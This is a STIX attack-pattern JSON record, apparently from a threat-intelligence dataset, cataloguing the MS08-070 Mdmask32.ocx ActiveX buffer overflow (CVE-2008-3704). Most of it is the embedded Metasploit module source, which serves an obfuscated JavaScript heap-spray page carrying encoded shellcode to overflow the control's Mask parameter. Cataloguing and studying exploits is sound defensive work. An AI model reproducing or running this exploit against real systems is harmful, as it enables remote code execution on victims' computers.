{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5bf4eb47-ef47-488c-a9a4-7e9db9dcc3aa",
    "created": "2024-08-14T16:43:52.588868Z",
    "modified": "2024-08-14T16:43:52.588872Z",
    "name": "Microsoft Visual Studio Mdmask32.ocx ActiveX Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Microsoft's Visual Studio 6.0. When passing a specially crafted string to the Mask parameter of the Mdmask32.ocx ActiveX Control, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms08_070_visual_studio_msmask.rb",
            "external_id": "ms08_070_visual_studio_msmask.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-3704"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft Visual Studio Mdmask32.ocx ActiveX Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Microsoft's Visual Studio 6.0.\n        When passing a specially crafted string to the Mask parameter of the\n        Mdmask32.ocx ActiveX Control, an attacker may be able to execute arbitrary\n        code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'koshi', 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2008-3704' ],\n          [ 'OSVDB', '47475' ],\n          [ 'BID', '30674' ],\n          [ 'MSB', 'MS08-070' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP2 IE 6.0 SP0-SP2', { 'Ret' => '' } ]\n        ],\n      'DisclosureDate' => '2008-08-13',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('URIPATH', [ true, \"The URI to use.\", \"/\" ])\n      ])\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload.\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Create some nops.\n    nops    = Rex::Text.to_unescape(make_nops(4))\n\n    # Randomize the javascript variable names.\n    vname  = rand_text_alpha(rand(100) + 1)\n    var_i  = rand_text_alpha(rand(30)  + 2)\n    rand1  = rand_text_alpha(rand(100) + 1)\n    rand2  = rand_text_alpha(rand(100) + 1)\n    rand3  = rand_text_alpha(rand(100) + 1)\n    rand4  = rand_text_alpha(rand(100) + 1)\n    rand5  = rand_text_alpha(rand(100) + 1)\n    rand6  = rand_text_alpha(rand(100) + 1)\n    rand7  = rand_text_alpha(rand(100) + 1)\n    rand8  = rand_text_alpha(rand(100) + 1)\n    rand9  = rand_text_alpha(rand(100) + 1)\n    rand10  = rand_text_alpha(rand(100) + 1)\n    rand11  = rand_text_alpha(rand(100) + 1)\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    content = %Q|\n<html>\n  <script language=\"javascript\">\n  var #{rand1}='<object classid=\"clsid:C932BA85-4374-101B-A56C-00AA003668DC\"><param name=\"Mask\" value=\"';\n  var #{rand2}='\"></object>';\n  var #{rand3} = '';\n  for (#{var_i}=1;#{var_i}<=2145;#{var_i}++){#{rand3}=#{rand3}+unescape(\"%0c\");}\n  var #{rand4} = unescape(\"#{shellcode}\");\n  var #{rand5} = (#{rand4}.length * 2);\n  var #{randnop} = \"#{nops}\";\n  var #{rand6} = unescape(#{randnop});\n  var #{rand7} = 0x0c0c0c0c;\n  var #{rand8} = 0x100000;\n  var #{rand9} = #{rand8} - (#{rand5} + 1);\n  var #{rand10} = (#{rand7}+#{rand8})/#{rand8};\n  var #{rand11} = new Array();\n  while (#{rand6}.length*2<#{rand9})\n  { #{rand6} += #{rand6}; }\n  #{rand6} = #{rand6}.substring(0,#{rand9}/2);\n  for (#{var_i}=0;#{var_i}<#{rand10};#{var_i}++)\n  { #{rand11}[#{var_i}] = #{rand6} + #{rand4}; }\n  document.write(#{rand1}+#{rand3}+#{rand2});\n  </script>\n</html>\n      |\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-08-13",
    "x_mitre_platforms": [
        "win'"
    ]
}